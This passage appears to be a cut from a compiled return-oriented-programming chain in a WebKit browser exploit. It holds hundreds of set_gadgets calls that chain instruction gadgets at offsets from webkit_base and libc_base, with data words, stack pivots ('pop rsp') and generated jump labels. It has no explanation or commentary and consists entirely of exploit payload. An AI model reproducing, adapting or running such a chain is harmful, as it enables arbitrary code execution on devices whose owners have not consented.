db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170288, //L2562
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170320, //L2564
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170304, //L2563
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2562:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2563:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2564:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+170488, //L2566
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170504, //L2567
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170472, //L2565
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2565:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2566:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2567:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170608, //L2569
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170672, //L2573
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170656, //L2572
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2570:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2571:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2572:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2573:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+170784, //L2574+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+170776, //L2574
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2574:
db([0, 0]); // 0x0
set_gadgets([
ropchain+170800, //L2574+24
ropchain+172432, //L2568
libc_base+793877, //pop rsi
ropchain+170840, //L2575
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2575:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2577:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+170960, //L2580
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170944, //L2578
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2578:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2580:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+171128, //L2583
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171144, //L2584
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+171112, //L2581
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171096, //L2582
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2582:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2581:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2583:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2584:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171216, //L2585
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171232, //L2586
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2585:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2586:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171392, //L2590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171344, //L2588
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171376, //L2589
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2588:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2587:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L2589:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+171448, //L2592
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2592:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+171552, //L2594
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171584, //L2595
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171568, //L2593
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2594:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2593:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2595:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171656, //L2596
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171672, //L2597
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2596:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2597:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171768, //L2599
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171752, //L2598
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2599:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+171848, //L2601
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2601:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2600:
db([10, 0]); // 0xa
set_gadget(libc_base+206806,); //pop rdi
//L2602:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171984, //L2603
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172016, //L2605
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+172000, //L2604
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2603:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2604:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+172184, //L2607
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172200, //L2608
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172168, //L2606
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2606:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2607:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2608:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+172320, //L2610
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172352, //L2612
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+172336, //L2611
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2609:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2610:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2611:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2612:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+172424, //L2613
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2613:
db([0, 0]); // 0x0
//L2568:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+172544, //L2616
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172560, //L2617
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172528, //L2615
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2615:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2616:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2617:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+172680, //L2619
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172712, //L2621
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+172696, //L2620
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2618:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2621:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+172784, //L2622
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2622:
db([0, 0]); // 0x0
//L2515:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+172904, //L2625
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172920, //L2626
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172888, //L2624
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2624:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2625:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2626:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+173024, //L2628
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173072, //L2631
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+173056, //L2630
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2628:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2629:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2630:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2631:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+173184, //L2632+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+173176, //L2632
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2632:
db([0, 0]); // 0x0
set_gadgets([
ropchain+173200, //L2632+24
ropchain+175496, //L2627
libc_base+793877, //pop rsi
ropchain+173240, //L2633
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2633:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2635:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+173360, //L2638
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173344, //L2636
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2636:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+173528, //L2641
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173544, //L2642
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173512, //L2639
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+173496, //L2640
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2640:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2639:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2642:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+173616, //L2643
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173632, //L2644
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2643:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2644:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+173792, //L2648
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+173744, //L2646
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+173776, //L2647
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2646:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2645:
db([56, 0]); // 0x38
set_gadget(libc_base+206806,); //pop rdi
//L2647:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2648:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+173896, //L2650
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+173880, //L2649
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2649:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2650:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+173976, //L2651
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2651:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2653:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174096, //L2656
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174080, //L2654
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2654:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174168, //L2657
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+174184, //L2658
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2657:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174328, //L2661
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174296, //L2659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+174312, //L2660
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2659:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2660:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2661:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+174416, //L2663
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2662:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2663:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+174504, //L2664
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2664:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2666:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174624, //L2669
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174608, //L2667
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2667:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2669:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174712, //L2670
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+174728, //L2672
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2670:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174784, //L2673
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2673:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+174904, //L2675
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2675:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174960, //L2677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2677:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+175104, //L2681
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175072, //L2680
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2680:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2679:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L2681:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+175216, //L2682
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175248, //L2684
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+175232, //L2683
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2682:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+175344, //L2685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175360, //L2686
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2685:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+175472, //L2687
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175456, //L2688
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2688:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+176904, //L2689
//L2627:
libc_base+793877, //pop rsi
ropchain+175536, //L2690
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2690:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2692:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175656, //L2695
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175640, //L2693
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2693:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2695:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+175800, //L2698
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175768, //L2696
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175784, //L2697
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2696:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2697:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+175880, //L2699
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2699:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2701:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176000, //L2704
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175984, //L2702
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2702:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+176168, //L2707
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176184, //L2708
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176152, //L2705
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+176136, //L2706
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2706:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2707:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2708:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176280, //L2710
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176264, //L2709
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2709:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2710:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2712:
ropchain+176384, //L2711
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+177216, //L2713
//L2711:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+176520, //L2715
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
